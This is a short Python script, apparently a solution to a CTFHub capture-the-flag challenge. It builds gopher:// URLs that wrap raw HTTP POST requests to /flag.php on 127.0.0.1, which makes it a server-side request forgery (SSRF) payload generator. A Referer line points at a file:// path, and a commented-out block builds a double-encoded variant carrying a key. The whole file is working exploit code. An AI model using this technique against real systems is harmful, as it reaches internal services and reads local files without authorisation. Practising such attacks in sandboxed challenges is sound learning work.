from urllib.parse import quote


def main():
    post = """POST /flag.php HTTP/1.1
Host: challenge-1c137f1fa834ae8c.sandbox.ctfhub.com:10800
Content-Length: 181
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-1c137f1fa834ae8c.sandbox.ctfhub.com:10800/
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydTiC41grnGNBUik5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://challenge-1c137f1fa834ae8c.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarydTiC41grnGNBUik5
Content-Disposition: form-data; name="file"; filename="a.txt"
Content-Type: text/plain

1

------WebKitFormBoundarydTiC41grnGNBUik5--
"""

    gopher = "gopher://127.0.0.1:80/_" + quote(post.replace("\n", "%0d%0a"))
    print(gopher)


if __name__ == '__main__':
    main()




# import urllib.parse

# payload = """
# POST /flag.php HTTP/1.1
# Host: 127.0.0.1
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 36

# key=a68a3b03e80ce7fef96007dfa01dc077
# """
# tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
# new = tmp.replace('%0A','%0D%0A') #CRLFL漏洞
# result = 'gopher://127.0.0.1:80/'+'_'+new
# result = urllib.parse.quote(result)# 对新增的部分继续编码
# print(result)
